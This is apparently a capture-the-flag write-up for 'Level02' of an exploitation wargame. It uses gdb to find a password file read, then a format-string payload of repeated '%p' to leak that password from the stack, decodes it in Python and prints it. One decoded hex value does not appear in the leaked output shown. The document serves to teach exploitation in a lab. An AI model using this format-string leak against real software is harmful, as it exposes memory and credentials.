Level02

By using info function we can see that program opens file with password.

   0x00000000004008a2 <+142>:	mov    %rdx,%rsi
   0x00000000004008a5 <+145>:	mov    %rax,%rdi
=> 0x00000000004008a8 <+148>:	callq  0x400700 <fopen@plt>

(gdb) printf "%s %s", $rdx, $rax
r /home/users/level03/.pass(gdb)

Additionaly there is an unprotected printf that prints the name of the user.
This means that if we include %p or %x modifiers we can print anything up on the stack, including the copy of the flag.
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p

===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p--[ Password:
*****************************************
AAAA 0x7fffffffe4a0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe698 0x1f7ff9a08 
0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 
0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 
(nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 does not have access!

Read bytes in reverse and convert them to ascii from hex.
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873
Using python
>>> "756e505234376848".decode("hex")[::-1]
'Hh74RPnu'
>>> "45414a3561733951".decode("hex")[::-1]
'Q9sa5JAE'
>>> "377a7143574e6758".decode("hex")[::-1]
'XgNWCqz7'
>>> "354a35686e475873".decode("hex")[::-1]
'sXGnh5J5'
>>> "48336750664b394d".decode("hex")[::-1]
'M9KfPg3H'
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H